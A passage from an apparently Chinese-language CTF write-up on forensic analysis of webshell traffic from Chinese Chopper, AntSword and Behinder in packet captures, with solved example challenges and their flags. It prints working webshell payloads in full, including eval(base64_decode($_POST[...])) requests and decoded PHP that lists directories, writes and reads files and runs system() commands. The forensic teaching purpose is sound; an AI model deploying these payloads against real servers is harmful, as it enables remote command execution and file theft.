foreach(range(&quot;A&quot;,&quot;Z&quot;) as $L)if(is_dir(&quot;&#123;$L&#125;:&quot;))$R.=&quot;&#123;$L&#125;:&quot;;&#125;//获取磁盘信息</span><br><span class="line">$R.=&quot;\t&quot;;</span><br><span class="line">$u=(function_exists(&#x27;posix_getegid&#x27;))?@posix_getpwuid(@posix_geteuid()):&#x27;&#x27;;</span><br><span class="line">$usr=($u)?$u[&#x27;name&#x27;]:@get_current_user();</span><br><span class="line">$R.=php_uname();	//获取服务器操作系统信息</span><br><span class="line">$R.=&quot;(&#123;$usr&#125;)&quot;;		//获取当前用户</span><br><span class="line">print $R;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);die();	//退出当前脚本</span><br></pre></td></tr></table></figure>
+
+<p>服务器返回的 HTTP 数据包不再进行编码，可以看到明文的返回结果:-&gt;C:&#x2F;AppServ&#x2F;www&#x2F;uploads\tA:C:D:\tWindows NT WIN-J3FT8P9R9AQ 6.1 build 7600(SYSTEM)|&lt;-。可以发现，PHP 脚本确实被运行，一般菜刀连接后的第一个包都会获取上述信息。接下来我们针对菜刀常见的列目录、上传、下载、虚拟终端等功能做详细分析。</p>
+<h3 id="（1）列目录"><a href="#（1）列目录" class="headerlink" title="（1）列目录"></a>（1）列目录</h3><p>列目录是吧某个路径下的文件和文件夹遍历输出。URL解码后的POST实体如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=QzpcXA==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$D=base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$F=@opendir($D);</span><br><span class="line">if($F==NULL)</span><br><span class="line">&#123;</span><br><span class="line">	echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	$M=NULL;</span><br><span class="line">	$L=NULL;</span><br><span class="line">	while($N=@readdir($F))</span><br><span class="line">	&#123;</span><br><span class="line">		$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));</span><br><span class="line">		@$E=substr(base_convert(@fileperms($P),10,8),-4);</span><br><span class="line">		$R=&quot;\t&quot;.$T.&quot;\t&quot;.@filesize($P).&quot;\t&quot;.$E.&quot;&quot;;</span><br><span class="line">		if(@is_dir($P))</span><br><span class="line">			$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;</span><br><span class="line">	&#125;</span><br><span class="line">	echo $M.$L;@closedir($F);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>脚本的主要逻辑是:对 z1进行 Base64 解码，遍历解码后路径下的全部内容。代码打开指定目录的句柄，然后进行循环扫描，并附带名称、时间、大小、日期这四个参数，用\t拼在一起发送回客户端。z1解码后的内容是C:\\，表示会把 C盘根目录下的所有内容列出来。列目录是经常用到的功能，在流量中，z0 不会改变，z1 则根据目录的不同而变化。</p>
+<h3 id="（2）上传文件"><a href="#（2）上传文件" class="headerlink" title="（2）上传文件"></a>（2）上传文件</h3><p>上传文件的流量比较有特点，首先是有 3 个参数。URL解码后的流量特征如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik/IjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw==&amp;z1=QzpcXEFwcFNlcnZcXHd3d1xcZmlsZXNcXHdvcmxkLnBuZw==&amp;z2=89504E47......</span><br></pre></td></tr></table></figure>
+
+<p>z0解码后的结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$f=base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$c=$_POST[&quot;z2&quot;];</span><br><span class="line">$c=str_replace(&quot;\r&quot;,&quot;&quot;,$c);</span><br><span class="line">$c=str_replace(&quot;\n&quot;,&quot;&quot;,$c);</span><br><span class="line">$buf=&quot;&quot;;</span><br><span class="line">for($i=0;$i&lt;strlen($c);$i+=2)</span><br><span class="line">	$buf.=urldecode(&quot;%&quot;.substr($c,$i,2));</span><br><span class="line">echo(@fwrite(fopen($f,&quot;w&quot;),$buf)?&quot;1&quot;:&quot;0&quot;);;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>利用fwrite 函数把z2 数据写到 z1解码后的路径中，如果写文件成功，就返回1，否则返回0。z2经过 Base16 编码，提取出z2的数据，就能获上传的文件。z1 解码后的路径是 C:\\AppServ\\www\\files\\world.png。需要特别说明的是，文件上传完成后，菜刀会再做一次列目录操作，在列目录的返回包中就能看到 world.png文件。</p>
+<h3 id="（3）下载文件"><a href="#（3）下载文件" class="headerlink" title="（3）下载文件"></a>（3）下载文件</h3><p>下载文件也是菜刀经常用到的功能，其数据包的特点是: 文件路径明文显示，没有被编码。具体如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=C:\\AppServ\\www\\files\\hello.rar</span><br></pre></td></tr></table></figure>
+
+<p>z0解码后的结果是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$F=get_magic_quotes_gpc()?stripslashes($_POST[&quot;z1&quot;]):$_POST[&quot;z1&quot;];$fp=@fopen($F,&quot;r&quot;);</span><br><span class="line">if(@fgetc($fp))</span><br><span class="line">&#123;</span><br><span class="line">	@fclose($fp);</span><br><span class="line">	@readfile($F);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">	echo(&quot;ERROR:// Can Not Read&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>返回包以明文的方式包含上述 echo 指令打印的前缀 (“-&gt;|”)和要下载的文件。需要注意的是，如果要从流量中提取出菜刀工具下载的文件，一定要删除菜刀 PHP 代码添加的前缀，否则文件不能正常打开</p>
+<h3 id="（4）虚拟终端"><a href="#（4）虚拟终端" class="headerlink" title="（4）虚拟终端"></a>（4）虚拟终端</h3><p>虚拟终端是菜刀中一个非常实用的功能，就像攻击者获取了服务器 shell 一样，使得攻击者可以完成交互，获得更多的信息和操作。虚拟终端的流量如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsNCmVjaG8oIi0+fCIpOzsNCiRwPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MSJdKTsNCiRzPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJ6MiJdKTsNCiRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTsNCiRjPXN1YnN0cigkZCwwLDEpPT0iLyI/Ii1jICd7JHN9JyI6Ii9jIHskc30iOw0KJHI9InskcH0geyRjfSI7DQpAc3lzdGVtKCRyLiIgMj4mMSIpOzsNCmVjaG8oInw8LSIpOw0KZGllKCk7&amp;z1=Y21k&amp;z2=Y2QgL2QgIkQ6XHBocFN0dWR5XFdXV1x1cGxvYWQtbGFic1x1cGxvYWRcIiZ3aG9hbWkmZWNobyBbc10mY2QmZWNobyBbRV0=</span><br></pre></td></tr></table></figure>
+
+<p>这段载荷有3个参数，但是第2个参数几乎总是￥21k，可以作为虚拟终端流量的强特征。</p>
+<p>z0解码后为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-&gt;|&quot;);;</span><br><span class="line">$p=base64_decode($_POST[&quot;z1&quot;]);</span><br><span class="line">$s=base64_decode($_POST[&quot;z2&quot;]);</span><br><span class="line">$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c=substr($d,0,1)==&quot;/&quot;?&quot;-c &#x27;&#123;$s&#125;&#x27;&quot;:&quot;/c &#123;$s&#125;&quot;;</span><br><span class="line">$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">@system($r.&quot; 2&gt;&amp;1&quot;);;</span><br><span class="line">echo(&quot;|&lt;-&quot;);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>z1解码后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br></pre></td></tr></table></figure>
+
+<p>z2解码后为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d &quot;D:\phpStudy\WWW\upload-labs\upload\&quot;&amp;whoami&amp;echo [s]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>将 z1、z2 的值解码后保存到 $p、$s 中，获取的 shell 文件的绝对路径保存到 $d 中通过判断绝对路径的第一位来区分 Linux 和 Windows 系统。本例中的路径是 Windows 系统路径，所以要执行的语句为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c cd /d &quot;D:\phpStudy\WWW\upload-labs\upload\&quot;&amp;whoami&amp;echo [s]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>真正执行的命令为 whoami，并将结果重定向输出。</p>
+<h3 id="（5）解题技巧"><a href="#（5）解题技巧" class="headerlink" title="（5）解题技巧"></a>（5）解题技巧</h3><p>目前，在 CTF 比赛中，菜刀流量主要考查列目录、文件上传&#x2F;下载和虚拟终端等功能。我们当然可以逐个把 POST 数据包中的内容解码，查看代码逻辑，但这么做有些烦琐，一种更简单的方法是根据 POST 包的返回包内容猜测 POST 包中代码的功能</p>
+<h3 id="例题packet3-pcapng"><a href="#例题packet3-pcapng" class="headerlink" title="例题packet3.pcapng"></a>例题packet3.pcapng</h3><p>根据协议分级，重点查看HTTP 协议数据包。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131114452.png" alt="image-20240113111426350"></p>
+<p>发现都是 POST请求，猜测可能是菜刀流量。我们首先查看第二个包，也就是第一个POST请求对应的返回包，其结果为”<code>-&gt;|C:/AppServ/www/uploads\tA:C:D:\tWindows NT WIN-J3FT8P9R9AQ 6.1 build 7600(SYSTEM)|&lt;-</code>“,此时可以确定第一个POST请求中的代码是为了获取系统信息。逐个查看 POST 请求的返回包，在第83个数据包中看到了rar 文件的头部，结合第 82个数据包，判断是从服务器下载hello.rar文件，将其导出。同理，对于第 234个数据包，服务器返回1，结合第 233个数包，判断是向服务器上传文件，将文件导出，再经过 Base16解码，得到一张 PNG 图片。将RAR 压缩包解压，结合 PNG 图片信息，得到完整的 flag:c7265f898a52fcc4</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131151109.png" alt="image-20240113115111052"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131144005.png" alt="image-20240113114440948"></p>
+<p>蚁剑的流量特征和菜刀有相似之处，都是通过 POST 请求发送脚本。但是蚁剑做了更多的优化，以减少流量特征。如图所示，在连接木马前可以选择编码器和解码器，除了菜刀默认的 Base64 编码，还可以选择 chr、rot 等方式。不仅 POST请求包可以被编码，返回包的数据也可以被编码，这增加了分析的难度。但是，上传和下载的文件不会被编码，可以被直接提取。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131140021.png" alt="image-20240113114011970"></p>
+<h3 id="例题yijian-pcapng"><a href="#例题yijian-pcapng" class="headerlink" title="例题yijian.pcapng"></a>例题yijian.pcapng</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131153280.png" alt="image-20240113115334218"></p>
+<p>协议分级后，重点关注HTTP 的协议数据，重点分析蚁剑的 POST请求和返回信息。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131340513.png" alt="image-20240113134053446"></p>
+<p>图中的 POST 请求包采用ROT3 的方式对传输内容加密，并且用boundary 分隔多个字段。boundary 的使用是蚁剑流量的特征之一，不难发现，返回包的内容也是经过ROT13 加密的。在第 60 个数据包发现了从服务器下载的 zip 压缩包，将其提取并解压后，就能看到 flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131344842.png" alt="image-20240113134409801"></p>
+<h3 id="06菜刀"><a href="#06菜刀" class="headerlink" title="06菜刀"></a>06菜刀</h3><p>跟例题packer3.pcapng一样，但我要做个补充</p>
+<p>打开数据包，发现抓包文件很小，随便找个TCP数据包，右击选择“跟踪TCP码流”，根据会话内容很像是菜刀的数据包。选择“Statistcs”—&gt;“Conversations”，选择TCP档，发现存在8个TCP会话</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131401103.png" alt="image-20240113140124044"></p>
+<p>一个个分析，发现其中前5个会话是通过菜刀查看目录的一个操作，返回部分返回了一个目录中的内容（可通过对选中部分先进行URL解码，再进行Base64解码，即可看到菜刀执行的代码，进而分析其逻辑）。而第6个会话是一个下载文件的会话，第7个会话是一个上传文件的会话。</p>
+<p>分析第6个会话，可以看到会话的逻辑是下载一个hello.rar的文件，随后web进行了响应，将hello.rar的内容返回给了客户端。这里因为服务器在响应时使用了Transfer-Encoding选项，所以这里不能直接使用“Save as”保存数据包中的内容再用winhex提取出来（可以是可以，但是这种方式保存下来的数据需要自己写个脚本进行处理然后才能用winhex提取文件，太麻烦）</p>
+<p>那如何导出文件？选择“File”-&gt;“Export Objects”-&gt;“Http”，找到我们刚才下载文件会话的HTTP返回的那个Object，通过save as将其保存为文件。（通过这种方式提取出来的http数据，wiresahrk会自动帮我们解决采用Transfer-encoding传输的问题，而不需要我们自己去解决）</p>
+<p> 通过winhex打开刚刚保存的文件，将“-&gt;|”和“|&lt;-”之间的数据保存为一个Rar文件。解压后发现是一张图片，里面有半个key。（“-&gt;|”和“|&lt;-”为在传输数据时，菜刀加入的内容）</p>
+<p>因为只有半个key，所以还需要分析上传逻辑。首先将菜刀的代码部分进行urldecode、base64解码还原出来，如图所示。很明显是一个上传文件的逻辑，这个无法用winhex提取文件，只能将菜刀的上传代码稍作修改，并在php环境下运行，即可以得到上传文件。</p>
+<h3 id="15菜刀密文抓取"><a href="#15菜刀密文抓取" class="headerlink" title="15菜刀密文抓取"></a>15菜刀密文抓取</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141225944.png" alt="image-20240114122513895"></p>
+<p>导出30</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141225602.png" alt="image-20240114122538558"></p>
+<p>发现有flag.tar.gz</p>
+<p>那我直接就导出对象，另存为flag.tar.gz</p>
+<p>key{8769fe393f2b998fa6a11afe2bfcd65e}</p>
+<h3 id="34Webshell"><a href="#34Webshell" class="headerlink" title="34Webshell"></a>34Webshell</h3><blockquote>
+<p>类型：Forensic 黑客通过webshell往Web服务器写入了一串机密信息，你能找出机密信息吗？</p>
+</blockquote>
+<p>协议分析是http</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401141258222.png" alt="image-20240114125828157"></p>
+<p>发现是菜刀流量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x=@eval(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEBmd3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=L3Zhci93d3cvaHRtbC9zZWNyZXQvczNjcjN0LnR4dA%3D%3D&amp;z2=ZmxhZ3tJbmYwcm00dGkwbjUzY3VyaXR5fQ%3D%3D</span><br></pre></td></tr></table></figure>
+
+<p>解码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x=@eval(base64_decode($_POST[action]));&amp;action=@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(&quot;-&gt;|&quot;);;echo @fwrite(fopen(base64_decode($_POST[&quot;z1&quot;]),&quot;w&quot;),base64_decode($_POST[&quot;z2&quot;]))?&quot;1&quot;:&quot;0&quot;;;echo(&quot;|&lt;-&quot;);die();</span><br><span class="line">&amp;z1=/var/www/html/secret/s3cr3t.txt</span><br><span class="line">&amp;z2=flag&#123;Inf0rm4ti0n53curity&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="考点-3-冰蝎流量分析"><a href="#考点-3-冰蝎流量分析" class="headerlink" title="考点 3:冰蝎流量分析"></a>考点 3:冰蝎流量分析</h2><p>无论是菜刀还是蚁剑，在流量加密保护方面均存在较大的缺陷。为了更好地对流量加密、逃避防火墙拦截，冰蝎应运而生。冰蝎也是一个 Webshell 管理工具，它可以在HTTP明文协议中建立加密隧道，以躲避安全设备的检测。我们以2.0.1 版本为例，分析冰蝎的协议特征。它使用对称加密算法，加密过程总共分为三步:</p>
+<h3 id="1-密钥传递阶段。"><a href="#1-密钥传递阶段。" class="headerlink" title="1)密钥传递阶段。"></a>1)密钥传递阶段。</h3><p>客户端向服务器请求密钥，密钥是明文传递的。客户端向服务器发起GET请求以协商密钥，GET 请求的URI中只带一个参数，如图所示，URI中的pass 参数是冰蝎连接时的密码，等号后的数字是随机生成的。密钥位于服务器返回包的实体部分，一般是 16 字节的小写字母或数字。密协商阶段会发起多个 GET 请求，可以根据HTTP 头部字段的 cookie 值判断使用哪个密钥。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131408520.png" alt="image-20240113140809470"></p>
+<h3 id="2-算法协商阶段。"><a href="#2-算法协商阶段。" class="headerlink" title="2)算法协商阶段。"></a>2)算法协商阶段。</h3><p>冰蝎将一串 Payload 用不同的算法加密，然后发送给服务器。如果服务器成功解密，那么接下来的通信就使用这种算法。如果算法不对，则解密失败，那么响应为空，冰蝎会更换另一种加密算法进行尝试，直到成功为止。加密算法一般为 AES128 CBC模式和异或加密，两种加密采用相同的密钥。如果使用AES 加密，则IV为全0。图1.2.39 展示了算法协商过程，当服务器采用某种加密算法不能解密客户端的数据时，服务器会把 Content-type 字段置为 0，当客户端收到这样的返回值后，会采用另一种加密算法再发送一次 Payload。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131409120.png" alt="image-20240113140936064"></p>
+<h3 id="3-加密通信阶段。"><a href="#3-加密通信阶段。" class="headerlink" title="3)加密通信阶段。"></a>3)加密通信阶段。</h3><p>客户端使用上述密钥和算法加密 Payload 后，通过 POST 请求将脚本发送给服务端，服务端解密后执行，并将结果以相同密钥和加密算法返回给客户端。</p>
+<h3 id="例题bingxie-pcapng"><a href="#例题bingxie-pcapng" class="headerlink" title="例题bingxie.pcapng"></a>例题bingxie.pcapng</h3><p>]打开文件后进行协议分级，重点关注 HTTP。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131410996.png" alt="image-20240113141047934"></p>
+<p>我们发现有两个是GET 请求，其余都是 POST请求，结合 URI的特征，判断可能是冰蝎流量。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131411477.png" alt="image-20240113141121424"></p>
+<p>根据第 22 个数据包的cookie值，可以发现采用第2次 GET 协商的密钥，由于加密算法未知，因此可以把 AES加密和异或加密都尝试一遍。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202401131416492.png" alt="image-20240113141607443"></p>
+<p>利用脚本 BX2_aes_decrypt.py和BX2_xor_decrypt.py分别对其解密，发现采用的是异或加密。利用异或解密脚本 BX2_xor_decrypt.py分别对POST请求包解密，也就是题目中第27、143、171、183 个数据包(需要根据不同数据包的内容修改脚本中text对应的值)。对第 183 个数据包解密后，将其中的 Base64 数据解码，可看到图的内容。结合代码逻辑，可知是向服务器上传了 flag.zip 文件，文件内容经 Base64 编码后存储在 $content 的变量中。将 $content 解码，得到 zip 压缩包，解压后就得到 flag</p>
